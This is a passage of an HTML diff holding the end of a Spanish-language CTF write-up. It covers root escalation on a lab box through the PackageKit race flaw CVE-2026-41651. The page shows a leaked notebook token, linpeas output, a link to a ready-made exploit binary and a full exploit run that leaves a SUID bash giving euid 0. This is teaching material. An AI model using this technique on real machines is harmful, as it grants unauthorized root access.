+                <pre><code class="language-plaintext">marimo  384246  4.8  2.3  1117264  96104  ?  Ssl  0:01  \_ /opt/marimo/venv/bin/python3 /opt/marimo/venv/bin/marimo edit \
+  /home/marimo/notebooks/retention.py \
+  --headless --host 127.0.0.1 -p 8888 \
+  --token --token-password <span style="color:#e5c07b;">YKQ6iPyO5kusNx0BpVAPfjP5</span> \
+  --skip-update-check --no-sandbox</code></pre>
+
+                <p>El token es interesante pero en última instancia no sirve para escalar privilegios — el proceso de marimo ya se ejecuta como el usuario <code>marimo</code>, la misma cuenta a la que tengo acceso. Conocer el token no aporta ningún privilegio adicional.</p>
+
+                <p>Reviso otros vectores comunes de escalada (reglas sudo, binarios SUID, tareas cron, rutas con permisos de escritura) pero no encuentro nada explotable mediante comprobaciones estándar.</p>
+
+                <h2>Escalada de Privilegios — CVE-2026-41651 (Pack2TheRoot)</h2>
+                <p>Antes de descartar la enumeración automatizada, ejecuto la última versión de <a href="https://github.com/peass-ng/PEASS-ng/releases">linpeas</a> — merece la pena ejecutar versiones actualizadas ya que se añaden nuevos CVEs regularmente. Detecta algo interesante:</p>
+
+                <pre><code class="language-plaintext">╔══════════╣ Checking for PackageKit Pack2TheRoot (CVE-2026-41651) (T1068)
+╚ https://github.security.telekom.com/2026/04/pack2theroot-linux-local-privilege-escalation.html
+
+PackageKit version detected: <span style="color:#e5c07b;">1.2.8-2ubuntu1.2</span>
+
+<span style="color:#e06c75;">Vulnerable to CVE-2026-41651 (Pack2TheRoot)</span> - PackageKit 1.2.8-2ubuntu1.2 is below the Ubuntu 24.04 fixed version: 1.2.8-2ubuntu1.5
+
+══╣ PackageKit daemon reachability
+pkcon/pkmon present - daemon can be activated on demand via D-Bus</code></pre>
+
+                <p>CVE-2026-41651, conocido como <strong>Pack2TheRoot</strong>, es una condición de carrera TOCTOU (Time-Of-Check Time-Of-Use) en el flujo de instalación de paquetes de PackageKit. Enviando dos transacciones <code>InstallFiles</code> manipuladas de forma rápida y sucesiva — una para engañar la comprobación de autorización y otra con el payload malicioso — un atacante puede hacer que PackageKit (ejecutándose como root) instale un paquete que deposita un binario SUID en el sistema de archivos, consiguiendo escalada de privilegios local sin necesitar permisos sudo.</p>
+
+                <p>Hay disponible un binario de exploit listo para usar en: <a href="https://github.com/Vozec/CVE-2026-41651">https://github.com/Vozec/CVE-2026-41651</a></p>
+
+                <p>Transfiero el binario al objetivo y lo ejecuto:</p>
+
+                <pre><code class="language-plaintext">marimo@cohort:~$ ./cve-2026-41651
+
+═══════════════════════════════════════════════════
+CVE-2026-41651 — PackageKit TOCTOU LPE
+═══════════════════════════════════════════════════
+
+[*] Building packages (pure C)...
+[+] dummy   : /tmp/.pk-dummy-384307.deb
+[+] payload : /tmp/.pk-payload-384307.deb
+[*] Transaction : /2_aebaaeda
+[*] Step 1 : InstallFiles(SIMULATE=0x4, dummy) [async]
+[*] Step 2 : InstallFiles(NONE=0x0, payload) [async]
+[*] Waiting for dispatch (30 s max)...
+[!] PK error 48: Failed to obtain authentication.
+[*] Finished (exit=2, 0 ms)
+[*] Loop ran for 156 ms
+[*] Polling for payload (120 s max)...
+[*] t+1s: payload=exists dpkg_lock=free suid=not yet
+[*] t+2s: payload=exists dpkg_lock=free suid=not yet
+[*] t+3s: payload=exists dpkg_lock=free suid=not yet
+<span style="color:#98c379;">[+] SUCCESS — SUID bash at t+2700ms</span>
+
+uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)
+
+.suid_bash: cannot set terminal process group (-1): Inappropriate ioctl for device
+.suid_bash: no job control in this shell</code></pre>
+
+                <p>El exploit gana la carrera a la comprobación de autorización de PackageKit enviando ambas transacciones de forma asíncrona. Aunque registra un error de "Failed to obtain authentication" para la transacción simulada, la carrera está ganada: el paquete payload se instala con privilegios de root antes de que la autorización se aplique completamente, dejando un binario <code>bash</code> con SUID-root. Ejecutándolo con <code>.suid_bash -p</code> obtengo un UID efectivo de 0 y consigo la flag de root.</p>
+            </div>
+
+        </article>
+    </main>
+
+    <script src="../../index.js"></script>
+</body>
+
+</html>
